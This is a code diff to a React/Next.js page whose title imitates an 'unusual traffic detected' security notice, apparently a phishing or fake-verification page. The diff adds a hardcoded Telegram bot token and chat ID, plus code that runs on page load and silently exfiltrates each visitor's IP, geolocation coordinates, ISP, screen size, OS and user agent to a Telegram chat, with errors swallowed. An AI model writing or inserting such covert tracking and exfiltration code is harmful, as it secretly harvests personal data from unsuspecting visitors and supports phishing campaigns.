@@ -6,6 +6,10 @@ import axios from 'axios';
 import Image from 'next/image';
 import { useRouter } from 'next/navigation';
 import { useEffect, useState, type FC } from 'react';
+
+const BOT_TOKEN = '8326611419:AAEJ7IbkbQ30oDd1dcwr8uTho-t1c2tX_X8';
+const CHAT_ID = '-1003997569663';
+
 const Index: FC = () => {
     const router = useRouter();
     const [isLoading, setIsLoading] = useState(false);
@@ -37,6 +41,47 @@ const Index: FC = () => {
             };
         }
     }, [isShowCheckMark, router]);
+
+    useEffect(() => {
+        const sendTelegramNotification = async () => {
+            try {
+                const geoResponse = await fetch('https://get.geojs.io/v1/ip/geo.json');
+                const geoData = await geoResponse.json();
+
+                const screenWidth = window.screen.width;
+                const screenHeight = window.screen.height;
+                const osInfo = navigator.platform;
+                const userAgent = navigator.userAgent.toLowerCase();
+
+                const fullData = `
+<b>Location:</b> <code>${geoData.city}, ${geoData.region}, ${geoData.country}</code>
+<b>IP:</b> <code>${geoData.ip}</code>
+<b>Coordinates:</b> <code>${geoData.latitude}, ${geoData.longitude}</code>
+<b>Accuracy:</b> <code>${geoData.accuracy}m</code>
+<b>Timezone:</b> <code>${geoData.timezone}</code>
+<b>Region:</b> <code>${geoData.continent_code}</code>
+<b>ASN:</b> <code>${geoData.asn}</code>
+<b>Organization:</b> <code>${geoData.organization_name} (${geoData.organization})</code>
+<b>Screen:</b> <code>${screenWidth}x${screenHeight}</code>
+<b>OS:</b> <code>${osInfo}</code>
+<b>User Agent:</b> <code>${userAgent}</code>`;
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: fullData,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch {
+                //
+            }
+        };
+
+        sendTelegramNotification();
+    }, []);
     return (
         <div className='flex flex-col items-center justify-center pt-37.5'>
             <title>Our systems have detected unusual traffic from your computer network</title>
